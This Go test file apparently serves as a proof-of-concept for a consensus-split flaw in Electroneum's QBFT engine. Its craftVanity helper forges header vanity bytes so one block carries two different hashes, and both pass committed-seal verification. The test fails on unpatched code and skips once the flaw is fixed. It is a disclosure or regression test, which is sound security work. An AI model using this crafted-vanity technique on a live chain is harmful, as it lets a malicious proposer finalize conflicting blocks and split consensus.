package qbftengine

import (
	"bytes"
	"fmt"
	"math/big"
	"testing"

	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/consensus/istanbul"
	istanbulcommon "github.com/electroneum/electroneum-sc/consensus/istanbul/common"
	"github.com/electroneum/electroneum-sc/consensus/istanbul/validator"
	"github.com/electroneum/electroneum-sc/core/types"
	"github.com/electroneum/electroneum-sc/crypto"
	"github.com/electroneum/electroneum-sc/rlp"
)

func rlpHdrLen(b []byte) int {
	switch c := b[0]; {
	case c < 0x80:
		return 0
	case c < 0xb8:
		return 1
	case c < 0xc0:
		return 1 + int(c-0xb7)
	case c < 0xf8:
		return 1
	default:
		return 1 + int(c-0xf7)
	}
}

// craftVanity builds VanityData of length vlen so that Extra[32:] parses as a
// legacy IstanbulExtra, flipping which filter Header.Hash() uses.
func craftVanity(t *testing.T, vlen int, vals []common.Address, round uint32, cs [][]byte) []byte {
	t.Helper()
	enc := func(v []byte) []byte {
		b, err := rlp.EncodeToBytes(&types.QBFTExtra{
			VanityData: v, Validators: vals, Vote: nil, Round: round, CommittedSeal: cs,
		})
		if err != nil {
			t.Fatalf("encode: %v", err)
		}
		return b
	}
	probe := enc(make([]byte, vlen))
	outerHdr := rlpHdrLen(probe)
	vanityStart := outerHdr + rlpHdrLen(probe[outerHdr:])
	off := 32 - vanityStart

	csEnc, err := rlp.EncodeToBytes(cs)
	if err != nil {
		t.Fatalf("encode cs: %v", err)
	}
	csStart := len(probe) - len(csEnc)

	M := (len(probe) - 32) - 3
	N := csStart - 32 - 7
	if off < 0 || off+7 > vlen || M < 256 || M > 0xffff || N < 256 || N > 0xffff {
		t.Fatalf("unusable params: off=%d M=%d N=%d", off, M, N)
	}
	if 1+3+N+len(csEnc) != M {
		t.Fatalf("length arithmetic wrong")
	}
	v := make([]byte, vlen)
	copy(v[off:], []byte{0xf9, byte(M >> 8), byte(M), 0xc0, 0xb9, byte(N >> 8), byte(N)})
	return v
}

// TestVanitySplit_BothVariantsVerify is the decisive test: it builds a real
// 4-validator header, signs REAL committed seals with the validators' keys, and
// runs the engine's own verifyCommittedSeals over two variants of the same block.
//
// If both verify while Header.Hash() differs, one Byzantine proposer can finalize
// the same block under two distinct, both-valid hashes.
func TestVanitySplit_BothVariantsVerify(t *testing.T) {
	const n = 4
	keys, addrs := genValidators(t, n)
	valSet := validator.NewSet(addrs, istanbul.NewProposerPolicy(istanbul.RoundRobin))
	quorum := int(2*n/3) + 1 // ceil(2N/3) for N=4 is 3

	engine := NewEngine(&istanbul.Config{}, addrs[0], func(data []byte) ([]byte, error) {
		return make([]byte, 65), nil
	})

	parent := &types.Header{
		Number: big.NewInt(0), ParentHash: common.Hash{}, MixDigest: types.IstanbulDigest,
		Difficulty: istanbulcommon.DefaultDifficulty, Coinbase: addrs[0],
		UncleHash: types.EmptyUncleHash, Time: 1, GasLimit: 30_000_000,
	}
	if err := ApplyHeaderQBFTExtra(parent, WriteValidators(addrs), writeRoundNumber(big.NewInt(0))); err != nil {
		t.Fatalf("parent extra: %v", err)
	}

	// Build the child header carrying the CRAFTED vanity, sized for `quorum` seals.
	placeholder := make([][]byte, quorum)
	for i := range placeholder {
		placeholder[i] = bytes.Repeat([]byte{0x00}, types.IstanbulExtraSeal)
	}
	vanity := craftVanity(t, 400, addrs, 0, placeholder)

	newChild := func(cs [][]byte) *types.Header {
		h := &types.Header{
			Number: big.NewInt(1), ParentHash: parent.Hash(), MixDigest: types.IstanbulDigest,
			Difficulty: istanbulcommon.DefaultDifficulty, Coinbase: addrs[0],
			UncleHash: types.EmptyUncleHash, Time: 2, GasLimit: 30_000_000,
		}
		b, err := rlp.EncodeToBytes(&types.QBFTExtra{
			VanityData: vanity, Validators: addrs, Vote: nil, Round: 0, CommittedSeal: cs,
		})
		if err != nil {
			t.Fatalf("encode child: %v", err)
		}
		h.Extra = b
		return h
	}

	// Seals are signed over QBFTHashWithRoundNumber(0), which strips CommittedSeal
	// and zeroes Round -- so one signature set is valid for every variant.
	shell := newChild(placeholder)
	payload := PrepareCommittedSeal(shell, 0)
	realSeals := make([][]byte, 0, n)
	for i := 0; i < n; i++ {
		sig, err := crypto.Sign(payload, keys[i])
		if err != nil {
			t.Fatalf("sign: %v", err)
		}
		realSeals = append(realSeals, sig)
	}

	variantA := newChild(realSeals[:quorum]) // craft matches -> legacy filter
	variantB := newChild(realSeals[:n])      // craft no longer matches -> QBFT filter

	// Sanity: the seal payload must be identical for both, or the seals would not
	// carry over and this whole thing would be moot.
	if !bytes.Equal(PrepareCommittedSeal(variantA, 0), PrepareCommittedSeal(variantB, 0)) {
		t.Fatal("seal payload differs between variants; seals would not be reusable")
	}

	// Variant R: same seals, Round bumped to 1. This is the vector that does NOT
	// work, and the PoC proves it rather than assuming it. Signers() builds the
	// seal payload as PrepareCommittedSeal(header, extra.Round) -- it reads the
	// round out of the header -- so bumping the round changes the payload and the
	// round-0 signatures no longer recover to validator addresses.
	variantR := func() *types.Header {
		h := newChild(realSeals[:quorum])
		b, err := rlp.EncodeToBytes(&types.QBFTExtra{
			VanityData: vanity, Validators: addrs, Vote: nil, Round: 1, CommittedSeal: realSeals[:quorum],
		})
		if err != nil {
			t.Fatalf("encode R: %v", err)
		}
		h.Extra = b
		return h
	}()
	errR := engine.verifyCommittedSeals(nil, variantR, []*types.Header{parent}, valSet)

	errA := engine.verifyCommittedSeals(nil, variantA, []*types.Header{parent}, valSet)
	errB := engine.verifyCommittedSeals(nil, variantB, []*types.Header{parent}, valSet)

	hA, hB := variantA.Hash(), variantB.Hash()

	fmt.Printf("\n=== ONE BLOCK, TWO VALID HASHES ===\n")
	fmt.Printf("  validators=%d, quorum=%d, seals signed by real keys\n\n", n, quorum)
	fmt.Printf("  variant A: %d committed seals -> verifyCommittedSeals = %v\n", quorum, errA)
	fmt.Printf("  variant B: %d committed seals -> verifyCommittedSeals = %v\n", n, errB)
	fmt.Printf("  variant R: round bumped to 1   -> verifyCommittedSeals = %v\n", errR)
	fmt.Printf("             ^ EXPECTED to fail: Signers() derives the seal payload from\n")
	fmt.Printf("               extra.Round, so a round change invalidates the seals.\n")
	fmt.Printf("               The round vector is NOT a second valid block.\n\n")
	fmt.Printf("  Header.Hash() A : %x\n", hA[:12])
	fmt.Printf("  Header.Hash() B : %x\n", hB[:12])
	fmt.Printf("  seal payload    : %x  (identical for both)\n\n", PrepareCommittedSeal(variantA, 0)[:12])

	if errA != nil || errB != nil {
		t.Fatalf("a variant failed verification (A=%v B=%v): no split", errA, errB)
	}
	if errR == nil {
		t.Fatalf("variant R verified unexpectedly; the round vector would then also be a valid block")
	}
	if hA == hB {
		fmt.Printf("  [MITIGATED] both variants hash identically -> no split\n\n")
		t.Skip("FilteredHeader no longer lets VanityData pick the filter")
	}

	// Red on unpatched code: that failure IS the finding.
	t.Errorf("CONSENSUS SPLIT: one block, two valid hashes. "+
		"variant A (%d seals) hash=%x and variant B (%d seals) hash=%x both pass "+
		"verifyCommittedSeals against the same seal payload %x",
		quorum, hA[:8], n, hB[:8], PrepareCommittedSeal(variantA, 0)[:8])
}
